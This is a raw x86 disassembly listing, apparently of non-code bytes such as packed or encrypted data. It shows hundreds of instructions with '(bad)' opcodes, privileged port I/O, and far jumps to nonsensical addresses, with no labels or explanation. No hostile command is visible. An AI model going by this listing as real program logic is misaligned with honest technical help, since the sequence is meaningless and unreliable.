  41aac3:	add    edx,DWORD PTR ds:0xcc859b68
  41aac9:	daa    
  41aaca:	mov    ds:0x2a1b152c,al
  41aacf:	ret    
  41aad0:	popf   
  41aad1:	mov    al,0x93
  41aad3:	adc    esp,DWORD PTR [edx+0x4c63f0d9]
  41aad9:	data16 adc al,0xd2
  41aadc:	cwde   
  41aadd:	out    dx,eax
  41aade:	push   edx
  41aadf:	arpl   WORD PTR [edx],di
  41aae1:	inc    edx
  41aae2:	jl     0x41ab4e
  41aae4:	cmp    ebx,DWORD PTR [eax]
  41aae6:	inc    esi
  41aae7:	dec    esi
  41aae8:	call   0x1e46db59
  41aaed:	(bad)  
  41aaef:	rol    BYTE PTR [ecx+0x2b50b6a9],0xec
  41aaf6:	mov    ebx,0x89d7cb0c
  41aafb:	sbb    BYTE PTR [edx+0x53],ah
  41aafe:	fidivr DWORD PTR [ebx]
  41ab00:	es inc eax
  41ab02:	sbb    eax,0xaa8b2d8d
  41ab07:	cdq    
  41ab08:	test   BYTE PTR [ebx+0x73631187],al
  41ab0e:	add    DWORD PTR [eax+0x1c],ecx
  41ab11:	pop    es
  41ab12:	repnz mov bl,BYTE PTR [edx]
  41ab15:	test   BYTE PTR [ebp-0x2fb76bd4],cl
  41ab1b:	sbb    eax,0x4d48b7ff
  41ab20:	dec    ebx
  41ab21:	dec    esp
  41ab22:	(bad)  
  41ab23:	ins    BYTE PTR es:[edi],dx
  41ab24:	pusha  
  41ab25:	outs   dx,BYTE PTR ds:[esi]
  41ab26:	cld    
  41ab27:	sbb    DWORD PTR [eax+0x10],ebx
  41ab2a:	pop    ecx
  41ab2b:	faddp  st(3),st
  41ab2d:	je     0x41ab5e
  41ab2f:	ret    
  41ab30:	xchg   cl,al
  41ab32:	out    dx,al
  41ab33:	and    edx,edx
  41ab35:	add    edx,DWORD PTR [ebx+0x6be863ee]
  41ab3b:	(bad)  
  41ab3c:	sahf   
  41ab3d:	add    bh,BYTE PTR [edi+esi*8+0x2c]
  41ab41:	aas    
  41ab42:	ins    DWORD PTR es:[edi],dx
  41ab43:	inc    esp
  41ab44:	test   al,0x54
  41ab46:	sbb    DWORD PTR [eax],ebx
  41ab48:	push   es
  41ab49:	(bad)  
  41ab4a:	out    dx,eax
  41ab4b:	pushf  
  41ab4c:	in     eax,dx
  41ab4d:	add    BYTE PTR [esi-0x5c],al
  41ab50:	sub    al,0xad
  41ab52:	stos   DWORD PTR es:[edi],eax
  41ab53:	cld    
  41ab54:	rcr    DWORD PTR ds:0x4d0db315,cl
  41ab5a:	jno    0x41ab11
  41ab5c:	sub    esp,DWORD PTR [ebx-0x45c3b485]
  41ab62:	shl    bl,1
  41ab64:	data16 mov ch,0x3b
  41ab67:	enter  0xa2e7,0xda
  41ab6b:	sbb    DWORD PTR [edx+ebx*1-0x5734aace],edi
  41ab72:	pop    ebp
  41ab73:	cmp    ecx,ecx
  41ab75:	sub    dl,ah
  41ab77:	add    cl,bl
  41ab79:	hlt    
  41ab7a:	jne    0x41ab4c
  41ab7c:	jle    0x41ab68
  41ab7e:	stos   DWORD PTR es:[edi],eax
  41ab7f:	sub    al,ch
  41ab81:	and    al,BYTE PTR [edx]
  41ab83:	inc    ecx
  41ab84:	or     BYTE PTR [esi+0x6f],bh
  41ab87:	cmp    BYTE PTR [edx],dl
  41ab89:	mov    ebx,DWORD PTR [esi]
  41ab8b:	sub    edi,0x11bdc38e
  41ab91:	inc    esi
  41ab92:	jge    0x41ab22
  41ab94:	fwait
  41ab95:	popf   
  41ab96:	xchg   ebp,eax
  41ab97:	cmp    bh,BYTE PTR [esi-0xf]
  41ab9a:	outs   dx,DWORD PTR ds:[esi]
  41ab9b:	(bad)  
  41ab9c:	loope  0x41ab82
  41ab9e:	inc    ebp
  41ab9f:	aas    
  41aba0:	cmc    
  41aba1:	(bad)  
  41aba2:	outs   dx,BYTE PTR ds:[esi]
  41aba3:	mov    al,fs:0xf622b4b6
  41aba9:	and    DWORD PTR [edx+0x14c5cb3d],ebx
  41abaf:	adc    al,0x19
  41abb1:	es ret 0xfd52
  41abb5:	jle    0x41abf3
  41abb7:	lahf   
  41abb8:	adc    eax,0xc8c2f82a
  41abbd:	daa    
  41abbe:	cmp    ebp,ecx
  41abc0:	popf   
  41abc1:	push   edi
  41abc2:	out    0xba,al
  41abc4:	hlt    
  41abc5:	fs jmp 0x31dc:0x5c494e42
  41abcd:	push   esp
  41abce:	pop    ebx
  41abcf:	push   eax
  41abd0:	inc    eax
  41abd1:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abd3:	call   0x3997:0x47948d64
  41abda:	cmp    eax,0x17ae33e5
  41abdf:	cs push ebx
  41abe1:	ds clc 
  41abe3:	mov    ebp,0x18a3bb7f
  41abe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abe9:	ret    
  41abea:	retf   
  41abeb:	rcl    DWORD PTR [edi-0x62],cl
  41abee:	aas    
  41abef:	sbb    esi,ebx
  41abf1:	cmp    BYTE PTR [eax-0x5d],0xda
  41abf5:	fdivr  QWORD PTR [edi]
  41abf7:	or     ah,BYTE PTR [edi+edi*4]
  41abfa:	nop
  41abfb:	pop    edx
  41abfc:	rcl    BYTE PTR [edi+0x6ce823f9],cl
  41ac02:	push   0x72
  41ac04:	cmp    DWORD PTR [eax],edx
  41ac06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac07:	scas   eax,DWORD PTR es:[edi]
  41ac08:	jge    0x41ac4f
  41ac0a:	mov    ebp,0x3473727a
  41ac0f:	push   esi
  41ac10:	pop    esp
  41ac11:	pop    ecx
  41ac12:	cdq    
  41ac13:	mov    edi,0xe99fb602
  41ac18:	retf   
  41ac19:	pop    ebx
  41ac1a:	sbb    dl,BYTE PTR [eax+edi*8]
  41ac1d:	mov    ebx,DWORD PTR [ebp+0x6965b293]
  41ac23:	mov    dl,0x87
  41ac25:	sub    eax,edi
  41ac27:	push   ds
  41ac28:	loope  0x41abc5
  41ac2a:	stc    
  41ac2b:	out    0x65,eax
  41ac2d:	adc    eax,DWORD PTR fs:[eax]
  41ac30:	add    al,0xbe
  41ac32:	push   0x1b
  41ac34:	cmc    
  41ac35:	fnstcw WORD PTR [esi-0x33dba68]
  41ac3b:	sub    eax,0x3f5616f6
  41ac40:	mov    ds:0x65f7ecc,al
  41ac45:	or     eax,0x37ae1164
  41ac4a:	daa    
  41ac4b:	out    dx,eax
  41ac4c:	mov    edx,0x33339f0f
  41ac51:	cmp    al,BYTE PTR [eax-0x5f]
  41ac54:	icebp  
  41ac55:	bound  ecx,QWORD PTR [edx]
  41ac57:	or     BYTE PTR ds:0x5fdb1a31,0x79
  41ac5e:	pushf  
  41ac5f:	mov    edx,DWORD PTR [ebx+0x138d5f34]
  41ac65:	je     0x41ac0e
  41ac67:	fsubrp st(6),st
  41ac69:	adc    BYTE PTR [esi+0x3e],dh
  41ac6c:	mov    dh,0xdf
  41ac6e:	fcom   DWORD PTR [eax+ebx*8]
  41ac71:	jecxz  0x41acec
  41ac73:	bound  esp,QWORD PTR [esi]
  41ac75:	and    BYTE PTR [edx-0x7f],al
  41ac78:	dec    eax
  41ac79:	xlat   BYTE PTR ds:[ebx]
  41ac7a:	inc    eax
  41ac7b:	daa    
  41ac7c:	xchg   ebx,eax
  41ac7d:	inc    eax
  41ac7e:	int3   
  41ac7f:	sub    eax,0x7fe2e72
  41ac84:	jg     0x41ac16
  41ac86:	pop    es
  41ac87:	sub    dl,dl
  41ac89:	sbb    dh,BYTE PTR [ecx-0x6c1c4a7e]
  41ac8f:	fstp   QWORD PTR [edx-0x2a]
  41ac92:	addr16 aad 0xb8
  41ac95:	shl    BYTE PTR [edx-0xa],1
  41ac98:	sbb    DWORD PTR [ebp-0x139f66aa],0xf18583b3
  41aca2:	hlt    
  41aca3:	je     0x41acf4
  41aca5:	addr16 cli 
  41aca7:	lds    esp,FWORD PTR [esp+ebp*2]
  41acaa:	xlat   BYTE PTR ds:[ebx]
  41acab:	test   BYTE PTR [esi+0x14],0xf5
  41acaf:	aam    0xba
  41acb1:	out    0xcc,eax
  41acb3:	inc    esi
  41acb4:	mov    WORD PTR [eax-0x131956d7],?
  41acba:	mov    ah,0xad
  41acbc:	popf   
  41acbd:	in     al,0xb0
  41acbf:	loop   0x41ad40
  41acc1:	(bad)  
  41acc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acc3:	xchg   DWORD PTR [esi+0x73c3c593],esp
  41acc9:	add    BYTE PTR [ebx-0x21bb0b10],0x35
  41acd0:	adc    ebx,esp
  41acd2:	xchg   DWORD PTR [esi+0x6b],esi
  41acd5:	arpl   WORD PTR [edx+0x31210a31],cx
  41acdb:	repnz sbb eax,0x1b24351e
  41ace1:	out    dx,eax
  41ace2:	xchg   ecx,eax
  41ace3:	inc    esi
  41ace4:	lods   al,BYTE PTR ds:[esi]
  41ace5:	mov    esp,DWORD PTR [edx+0x7f]
  41ace8:	adc    dl,BYTE PTR [eax]
  41acea:	(bad)  
  41aceb:	daa    
  41acec:	push   ebp
  41aced:	adc    dh,BYTE PTR [eax-0x11]
  41acf0:	addr16 mov al,ds:0x22c2
  41acf4:	test   BYTE PTR [edi+edi*1],dh
  41acf7:	add    eax,0xba8c7aff
  41acfc:	cli    
  41acfd:	dec    edx
  41acfe:	mov    ch,BYTE PTR [eax+eax*1+0x6e]
  41ad02:	sub    BYTE PTR [eax],bl
  41ad04:	mov    dh,0x1f
  41ad06:	popa   
  41ad07:	fsubr  QWORD PTR [ebp-0x5db36b32]
  41ad0d:	lock cmp DWORD PTR [ebx+0x56],edi
  41ad11:	push   ebp
  41ad12:	clc    
  41ad13:	dec    eax
  41ad14:	loope  0x41ad37
  41ad16:	sbb    ebx,DWORD PTR [esi-0x52f5e298]
  41ad1c:	dec    edi
  41ad1d:	pop    es
  41ad1e:	adc    dh,BYTE PTR [ebp+0x6f]
  41ad21:	ds jbe 0x41ad09
  41ad24:	add    al,0x9c
  41ad26:	and    al,0x77
  41ad28:	(bad)  [edi-0xa9cdf49]
  41ad2e:	loopne 0x41acb3
  41ad30:	imul   ebp,DWORD PTR [esi],0x5e1cc1ca
  41ad36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad37:	or     al,BYTE PTR [ebx+0x4c363a03]
  41ad3d:	jns    0x41ad2c
  41ad3f:	shr    BYTE PTR [eax-0x64abdf33],0x76
  41ad46:	sub    BYTE PTR [ecx],bl
  41ad48:	mov    ebx,0x7755e45d
  41ad4d:	dec    edx
  41ad4e:	pop    ss
  41ad4f:	mov    dh,0xc7
  41ad51:	(bad)  
  41ad52:	mov    ds:0x98d7a5e3,eax
  41ad57:	lds    esi,FWORD PTR [edx+eax*4-0x23]
  41ad5b:	popa   
  41ad5c:	jns    0x41adb7
  41ad5e:	retf   0x1d99
  41ad61:	das    
  41ad62:	scas   al,BYTE PTR es:[edi]
  41ad63:	cld    
  41ad64:	test   BYTE PTR [edx],bl
  41ad66:	mov    dl,0xea
  41ad68:	inc    ebx
  41ad69:	push   edi
  41ad6a:	retf   0x5463
  41ad6d:	loopne 0x41ad88
  41ad6f:	rol    dh,1
  41ad71:	jnp    0x41adc8
  41ad73:	xor    al,0xb6
  41ad75:	push   ecx
  41ad76:	(bad)  
  41ad78:	mov    dh,0xaf
  41ad7a:	movups xmm3,XMMWORD PTR ds:0x3ebd
  41ad80:	sar    BYTE PTR [edi],1
  41ad82:	xchg   esi,eax
  41ad83:	xchg   edx,eax
  41ad84:	ror    ecx,1
  41ad86:	out    dx,al
  41ad87:	leave  
  41ad88:	mov    ah,0x25
  41ad8a:	fwait
  41ad8b:	push   ds
  41ad8c:	or     ebx,DWORD PTR [ecx-0x533deaa3]
  41ad92:	mov    ?,WORD PTR [esp+ebx*4]
  41ad95:	nop
  41ad96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad98:	lods   eax,DWORD PTR ds:[esi]
  41ad99:	push   esi
  41ad9a:	mov    edx,DWORD PTR [ebx+0x7053285b]
  41ada0:	mov    esp,eax
  41ada2:	xor    BYTE PTR [esi],al
  41ada4:	mov    edi,ebp
  41ada6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ada7:	outs   dx,BYTE PTR ds:[esi]
  41ada8:	xchg   BYTE PTR [ecx],bh
  41adaa:	cmp    dh,dl
  41adac:	(bad)  
  41adad:	ror    DWORD PTR [edx-0x2fde63dc],cl
  41adb3:	retf   
  41adb4:	sbb    eax,0x97703247
  41adb9:	inc    edx
  41adba:	stos   BYTE PTR es:[edi],al
  41adbb:	rcr    BYTE PTR [esi-0x6edf3edb],cl
  41adc1:	dec    esi
  41adc2:	mov    esp,DWORD PTR [eax-0x3a548dab]
  41adc8:	popf   
  41adc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adca:	ins    DWORD PTR es:[edi],dx
  41adcb:	in     eax,0xcf
  41adcd:	idiv   DWORD PTR [ebp-0x6a]
  41add0:	mov    al,0x62
  41add2:	nop
  41add3:	(bad)  
  41add4:	jmp    0xfb9b:0x30adc7dd
  41addb:	mov    dh,0xe7
  41addd:	mov    cl,BYTE PTR [eax]
  41addf:	dec    ebp
  41ade0:	mov    es,WORD PTR [edi+0x14]
  41ade3:	add    al,ch
  41ade5:	xchg   esp,esi
  41ade7:	repz adc DWORD PTR [ebx+0xd53ea79],0x3898e784
  41adf2:	jmp    0x41ae0b
  41adf4:	call   0xe3df:0x5873ba00
  41adfb:	sub    BYTE PTR [edi+esi*4-0x1c],al
  41adff:	ror    ebp,0x2e
  41ae02:	stos   DWORD PTR es:[edi],eax
  41ae03:	into   
  41ae04:	icebp  
  41ae05:	mov    al,0xc1
  41ae07:	xchg   bx,ax
  41ae09:	(bad)  
  41ae0a:	lods   eax,DWORD PTR ds:[esi]
  41ae0b:	js     0x41add6
  41ae0d:	sahf   
  41ae0e:	push   cs
  41ae0f:	lock mov cl,0x3e
  41ae12:	(bad)  
  41ae13:	xchg   esp,eax
  41ae14:	ret    
  41ae15:	jno    0x41ae58
  41ae17:	iret   
  41ae18:	push   0xc14b3413
  41ae1d:	add    ebp,esp
  41ae1f:	mov    ah,0x75
  41ae21:	jmp    0x41ae82
  41ae23:	(bad)  
  41ae24:	adc    esi,DWORD PTR [eax-0x41fea48d]
  41ae2a:	(bad)  
  41ae2b:	sbb    DWORD PTR [edi],0xffffff90
  41ae2e:	and    BYTE PTR [esi],0x5f
  41ae31:	push   esi
  41ae32:	loopne 0x41ae9c
  41ae34:	js     0x41aea6
  41ae36:	pop    ds
  41ae37:	adc    dl,dl
  41ae39:	retf   
  41ae3a:	push   ds
  41ae3b:	push   es
  41ae3c:	addr16 push ebx
  41ae3e:	sub    DWORD PTR [esi-0x50],edi
  41ae41:	adc    edx,DWORD PTR [ebp-0x34]
  41ae44:	dec    esi
  41ae45:	retf   0xf01
  41ae48:	retf   
  41ae49:	push   cs
  41ae4a:	xchg   ebx,eax
  41ae4b:	and    ecx,edx
  41ae4d:	sahf   
  41ae4e:	ja     0x41aeae
  41ae50:	pop    es
  41ae51:	adc    esp,ecx
  41ae53:	pop    ecx
  41ae54:	or     DWORD PTR [ecx+0x24],edi
  41ae57:	fnstcw WORD PTR [esp+esi*8]
  41ae5a:	nop
  41ae5b:	mov    dl,0x38
  41ae5d:	mov    ds:0x1b3686bf,eax
  41ae62:	in     eax,0x9c
  41ae64:	leave  
  41ae65:	adc    ebp,DWORD PTR [ebp-0x78]
  41ae68:	add    al,0x68
  41ae6a:	repz or bh,BYTE PTR [esi]
  41ae6d:	ret    0xeaba
  41ae70:	or     al,0x1f
  41ae72:	mov    edx,0xd0d17702
  41ae77:	popa   
  41ae78:	xchg   ecx,eax
  41ae79:	popa   
  41ae7a:	cdq    
  41ae7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae7c:	xor    DWORD PTR [ecx+0x24],eax
  41ae7f:	sub    eax,DWORD PTR [ecx-0x13da250]
  41ae85:	xor    DWORD PTR [eax-0x4f],edx
  41ae88:	push   0x8ed626ca
  41ae8d:	mov    bh,0xd0
  41ae8f:	sahf   
  41ae90:	ret    
  41ae91:	mov    ebp,0xa2ff9c60
  41ae96:	xor    DWORD PTR [esi],ebx
  41ae98:	adc    esi,DWORD PTR [edi]
  41ae9a:	mov    ebx,0xecc73f04
  41ae9f:	imul   edi,DWORD PTR [ecx-0x6f],0xffffffa7
  41aea3:	scas   eax,DWORD PTR es:[edi]
  41aea4:	xor    cl,bh
  41aea6:	(bad)  
  41aea7:	pop    ecx
  41aea8:	xchg   edx,eax
  41aea9:	shr    BYTE PTR [eax+0x161709a],1
  41aeaf:	lea    eax,[esp+esi*1+0x30dab2b6]
  41aeb6:	stos   BYTE PTR es:[edi],al
  41aeb7:	mov    bh,0xe0
  41aeb9:	cmc    
  41aeba:	scas   eax,DWORD PTR es:[edi]
  41aebb:	inc    esi
  41aebc:	push   ebp
  41aebd:	jno    0x41aed4
  41aebf:	jns    0x41aef1
  41aec1:	sti    
  41aec2:	push   0x8a24942a
  41aec7:	imul   esp,edi,0xd5bdffdf
  41aecd:	xor    BYTE PTR [ebx],bh
  41aecf:	push   ecx
  41aed0:	xchg   ebp,eax
  41aed1:	stos   BYTE PTR es:[edi],al
  41aed2:	jae    0x41af31
  41aed4:	mov    ds:0xe699f168,eax
  41aed9:	xor    eax,0x8ccf87c9
  41aede:	jnp    0x41ae67
  41aee0:	in     al,dx
  41aee1:	inc    DWORD PTR [ebp+0x3d]
  41aee4:	push   0xfffffffd
  41aee6:	rol    BYTE PTR [eax-0xdf6888],1
  41aeec:	push   ds
  41aeed:	and    BYTE PTR [esi+0x6a],ah
  41aef0:	pusha  
  41aef1:	jg     0x41af41
  41aef3:	or     ecx,edx
  41aef5:	sbb    DWORD PTR [eax-0x29],ebx
  41aef8:	push   ecx
  41aef9:	imul   esp,DWORD PTR [edx+0x7f],0xfa502844
  41af00:	daa    
  41af01:	inc    eax
  41af02:	stos   BYTE PTR es:[edi],al
  41af03:	fadd   QWORD PTR [edi+0x8]
  41af06:	xlat   BYTE PTR ds:[ebx]
  41af07:	push   0xdb3e67fd
  41af0c:	nop
  41af0d:	or     eax,0x8398dd2
  41af12:	nop
  41af13:	dec    esp
  41af14:	adc    eax,0x93354d63
  41af19:	lock hlt 
  41af1b:	ret    
  41af1c:	test   eax,0x5d0fec75
  41af21:	test   al,0x7d
  41af23:	out    dx,eax
  41af24:	push   esi
  41af25:	aam    0xaa
  41af27:	mov    bl,0xfc
  41af29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af2a:	aad    0x69
  41af2c:	mov    WORD PTR ds:0xa672d4c9,cs
  41af32:	xor    BYTE PTR [eax+0x10],cl
  41af35:	mov    edx,0xf33fe7bb
  41af3a:	pop    es
  41af3b:	sbb    ebp,esp
  41af3d:	stos   BYTE PTR es:[edi],al
  41af3e:	xchg   esi,eax
  41af3f:	imul   ebp,DWORD PTR [edx-0x2f],0xfffffffa
  41af43:	loopne 0x41af34
  41af45:	fcomp  QWORD PTR [edi]
  41af47:	jne    0x41afaa
  41af49:	data16 (bad) 
  41af4b:	in     al,dx
  41af4c:	mov    dl,0x45
  41af4e:	jns    0x41af1f
  41af50:	xchg   DWORD PTR [edi+0x1f],edx
  41af53:	out    0x56,eax
  41af55:	(bad)  
  41af56:	cmp    bh,BYTE PTR ds:[edi+ebp*1]
  41af5a:	fxch   st(1)
  41af5c:	cmp    ebx,DWORD PTR [ebx+edi*8-0x7201da70]
  41af63:	imul   ebx,DWORD PTR [ecx],0xc21b2974
  41af69:	pop    edx
  41af6a:	cs inc eax
  41af6c:	push   cs
  41af6d:	cmp    BYTE PTR [eax],ch
  41af6f:	icebp  
  41af70:	and    eax,0x8c1cd9a2
  41af75:	mov    eax,0xbf9067e0
  41af7a:	loope  0x41af07
  41af7c:	hlt    
  41af7d:	sbb    esi,DWORD PTR [ebx+0x1b297955]
  41af83:	inc    ebx
  41af84:	ret    
  41af85:	mov    ebp,0x29539794
  41af8a:	pushf  
  41af8b:	icebp  
  41af8c:	int3   
  41af8d:	mov    ebx,0x2ca1edde
  41af92:	inc    esi
  41af93:	xchg   ebx,eax
  41af94:	push   cs
  41af95:	pop    eax
  41af96:	shr    cl,1
  41af98:	mov    cl,0x6c
  41af9a:	dec    ecx
  41af9b:	out    dx,al
  41af9c:	xchg   edx,eax
  41af9d:	xchg   BYTE PTR [edx+0x32db0176],dl
  41afa3:	aad    0xc6
  41afa5:	mov    gs,WORD PTR [edi+0x59]
  41afa8:	jg     0x41afe2
  41afaa:	xor    dh,BYTE PTR [eax-0x67]
  41afad:	mov    bl,0x9d
  41afaf:	les    eax,FWORD PTR [ebx]
  41afb1:	loopne 0x41b02b
  41afb3:	push   ss
  41afb4:	sar    BYTE PTR [eax],cl
  41afb6:	outs   dx,DWORD PTR ds:[esi]
  41afb7:	dec    ebp
  41afb8:	pop    ds
  41afb9:	fwait
  41afba:	addr16 jge 0x41afd0
  41afbd:	ret    0x643a
  41afc0:	popf   
  41afc1:	push   esp
  41afc2:	inc    ecx
  41afc3:	lods   eax,DWORD PTR ds:[esi]
  41afc4:	dec    ebp
  41afc5:	sbb    al,0xca
  41afc7:	(bad)  
  41afc8:	ror    BYTE PTR cs:[edx],1
  41afcb:	sub    WORD PTR ss:[ecx],di
  41afcf:	sub    BYTE PTR [eax],0x4f
  41afd2:	adc    al,BYTE PTR [ebx+0x5]
  41afd5:	popa   
  41afd6:	neg    BYTE PTR [esi+0x61]
  41afd9:	not    DWORD PTR [esi-0x2d1d1ed9]
  41afdf:	test   al,0x99
  41afe1:	ins    BYTE PTR es:[edi],dx
  41afe2:	cmp    esi,edi
  41afe4:	repz inc ecx
  41afe6:	jae    0x41afd9
  41afe8:	(bad)  
  41afea:	es mov bh,0x54
  41afed:	sbb    ch,BYTE PTR [edi]
  41afef:	or     eax,0x20c69ae7
  41aff4:	pop    ecx
  41aff5:	lea    eax,[edx+0x13f6ec65]
  41affb:	jecxz  0x41b017
  41affd:	mov    ds:0xa69454ab,al
  41b002:	test   BYTE PTR [ecx+0x25],cl
  41b005:	les    esi,FWORD PTR [edi]
  41b007:	subps  xmm7,xmm3
  41b00a:	mov    ebp,0x75c7e04a
  41b00f:	(bad)  
  41b010:	jle    0x41afb7
  41b012:	repz cdq 
  41b014:	sub    al,BYTE PTR [esp+ebx*1]
  41b017:	sub    ecx,DWORD PTR [esi+edi*1]
  41b01a:	add    esi,DWORD PTR [ecx-0x4e]
  41b01d:	pop    es
  41b01e:	push   eax
  41b01f:	mul    dh
  41b021:	popf   
  41b022:	int3   
  41b023:	aad    0x6
  41b025:	push   edi
  41b026:	jbe    0x41b016
  41b028:	mov    edx,0x38f60f43
  41b02d:	dec    ebx
  41b02e:	inc    esi
  41b02f:	add    BYTE PTR [edx+0x31],0xba
  41b033:	ret    0x1e05
  41b036:	ret    0xf2c2
  41b039:	jo     0x41b04d
  41b03b:	outs   dx,BYTE PTR ds:[esi]
  41b03c:	jae    0x41b085
  41b03e:	cmp    eax,0x3ccd1e38
  41b043:	idiv   DWORD PTR [esi]
  41b045:	mov    ecx,DWORD PTR [ebp-0x1f]
  41b048:	fcomip st,st(6)
  41b04a:	(bad)  
  41b04c:	imul   ecx,DWORD PTR [edx-0x358f139e],0x32
  41b053:	lea    ebp,[edx-0x37]
  41b056:	xor    dl,dh
  41b058:	sahf   
  41b059:	sbb    BYTE PTR [edi-0x10],dl
  41b05c:	cmc    
  41b05d:	xchg   esi,eax
  41b05e:	ror    BYTE PTR [edi],0xcd
  41b061:	or     BYTE PTR [esi-0x6ac987b9],0xc4
  41b068:	enter  0x389d,0x25
  41b06c:	lea    esp,[edi-0x5c]
  41b06f:	sub    dl,BYTE PTR [esi]
  41b071:	adc    al,0x95
  41b073:	dec    ecx
  41b074:	and    al,0x7c
  41b076:	mov    WORD PTR [edx-0x7b],gs
  41b079:	scas   al,BYTE PTR es:[edi]
  41b07a:	(bad)  
  41b07b:	idiv   BYTE PTR [esi-0x6e]
  41b07e:	data16 sbb ch,BYTE PTR [eax+ecx*2+0x13632d7f]
  41b086:	in     al,0x72
  41b088:	div    BYTE PTR [eax]
  41b08a:	lods   eax,DWORD PTR ds:[esi]
  41b08b:	mov    DWORD PTR [eax],esp
  41b08d:	inc    edx
  41b08e:	int    0x85
  41b090:	dec    eax
  41b091:	dec    ebx
  41b092:	jmp    0xfac2ba6a
  41b097:	or     dl,BYTE PTR [esi+edx*4]
  41b09a:	(bad)  
  41b09b:	fcmovu st,st(2)
  41b09d:	inc    edx
  41b09e:	or     ebx,DWORD PTR [esi+0x39]
  41b0a1:	std    
  41b0a2:	ins    DWORD PTR es:[edi],dx
  41b0a3:	call   FWORD PTR [esi+0x441836e]
  41b0a9:	adc    al,0xf
  41b0ab:	call   0xd8289ca7
  41b0b0:	sbb    eax,DWORD PTR [edx+0x596f19f9]
  41b0b6:	stos   BYTE PTR es:[edi],al
  41b0b7:	ja     0x41b093
  41b0b9:	push   0xffffff9b
  41b0bb:	xor    eax,0xc544e067
  41b0c0:	and    eax,0x7e7c9f3c
  41b0c5:	and    eax,0x1d24f176
  41b0ca:	push   ebp
  41b0cb:	jmp    0x41b0ed
  41b0cd:	retf   0x99ad
  41b0d0:	push   ds
  41b0d1:	dec    eax
  41b0d2:	ins    BYTE PTR es:[edi],dx
  41b0d3:	and    BYTE PTR [eax+0x57],bl
  41b0d6:	imul   esp,DWORD PTR [esi],0xffffffa4
  41b0d9:	mov    edx,0xb293573b
  41b0de:	xchg   esp,eax
  41b0df:	shr    BYTE PTR [edx],1
  41b0e1:	pop    es
  41b0e2:	inc    esi
  41b0e3:	mov    esp,DWORD PTR [edx-0x7d]
  41b0e6:	and    DWORD PTR [ebx-0x17],0x1d3d4183
  41b0ed:	mov    ds:0xd49cd2c3,al
  41b0f2:	cmp    DWORD PTR [ebp+eax*4-0x78],edi
  41b0f6:	int3   
  41b0f7:	shl    DWORD PTR [ecx],1
  41b0f9:	push   edx
  41b0fa:	sbb    al,0x30
  41b0fc:	cli    
  41b0fd:	(bad)  
  41b0fe:	sub    ebx,DWORD PTR [esi-0x7773681d]
  41b104:	mul    BYTE PTR [ebx-0x5aa00b07]
  41b10a:	ret    
  41b10b:	dec    edi
  41b10c:	ror    DWORD PTR [esi],1
  41b10e:	mov    dl,BYTE PTR [edi+0x1b2396d7]
  41b114:	jb     0x41b0c3
  41b116:	mov    BYTE PTR [esp+ecx*1],al
  41b119:	mov    esp,0x4aff1091
  41b11e:	sub    eax,DWORD PTR [ebp-0x68]
  41b121:	outs   dx,DWORD PTR ds:[esi]
  41b122:	dec    ecx
  41b123:	je     0x41b181
  41b125:	clc    
  41b126:	and    ebx,ebx
  41b128:	ins    DWORD PTR es:[edi],dx
  41b129:	mov    esi,0x793a759e
  41b12e:	arpl   WORD PTR [edi],cx
  41b130:	imul   edi,DWORD PTR [esi+0x12],0x6
  41b134:	sahf   
  41b135:	xchg   ebx,eax
  41b136:	jnp    0x41b103
  41b138:	and    eax,0x8eadb3d3
  41b13d:	pop    esp
  41b13e:	loopne 0x41b12a
  41b140:	push   ebp
  41b141:	and    dl,dl
  41b143:	mov    dh,0x26
  41b145:	loopne 0x41b0fa
  41b147:	call   0xac42dfbf
  41b14c:	scas   eax,DWORD PTR es:[edi]
  41b14d:	push   esi
  41b14e:	(bad)  
  41b14f:	mov    dl,0xe2
  41b151:	jmp    0xedf264df
  41b156:	jb     0x41b125
  41b158:	test   eax,0x8f181573
  41b15d:	fisub  DWORD PTR ds:0x20cdf8a4
  41b163:	daa    
  41b164:	pop    ecx
  41b165:	pop    esi
  41b166:	lahf   
  41b167:	inc    ebp
  41b168:	(bad)  
  41b169:	cwde   
  41b16a:	dec    edi
  41b16b:	sbb    esi,DWORD PTR ds:0x90d57b81
  41b171:	and    DWORD PTR [ecx],ecx
  41b173:	fst    DWORD PTR [ebp+eax*1-0x147ef9cd]
  41b17a:	inc    edi
  41b17b:	scas   eax,DWORD PTR es:[edi]
  41b17c:	push   eax
  41b17d:	clc    
  41b17e:	xchg   DWORD PTR [edx],esi
  41b180:	inc    eax
  41b181:	(bad)  
  41b182:	cmp    al,ch
  41b184:	xor    BYTE PTR [ebx+0x17],dh
  41b187:	lds    edx,FWORD PTR [ebx]
  41b189:	(bad)  
  41b18a:	push   ebp
  41b18b:	dec    edi
  41b18c:	fistp  WORD PTR [ebx]
  41b18e:	out    dx,eax
  41b18f:	sbb    DWORD PTR [edi],0xffffffde
  41b192:	rcr    BYTE PTR [ebx],cl
  41b194:	jle    0x41b1d7
  41b196:	shl    DWORD PTR [esi-0x39],1
  41b199:	pop    edx
  41b19a:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41b19c:	cli    
  41b19d:	stos   BYTE PTR es:[edi],al
  41b19e:	push   cs
  41b19f:	and    BYTE PTR [edx-0x51],0x7b
  41b1a3:	xchg   ecx,eax
  41b1a4:	test   al,0xae
  41b1a6:	fidivr DWORD PTR ss:[edi]
  41b1a9:	cs push 0x1f
  41b1ac:	frstor [edx-0x5a]
  41b1af:	inc    esi
  41b1b0:	mov    dh,0xfb
  41b1b2:	inc    ebp
  41b1b3:	inc    edx
  41b1b4:	push   ds
  41b1b5:	fld    QWORD PTR ds:0xdac389f9
  41b1bb:	ror    BYTE PTR [ecx],cl
  41b1bd:	out    0xfb,eax
  41b1bf:	or     al,0x37
  41b1c1:	xor    al,0x53
  41b1c3:	mov    al,0xb4
  41b1c5:	es dec eax
  41b1c8:	pop    esp
  41b1c9:	lahf   
  41b1ca:	mov    edi,0x3d511088
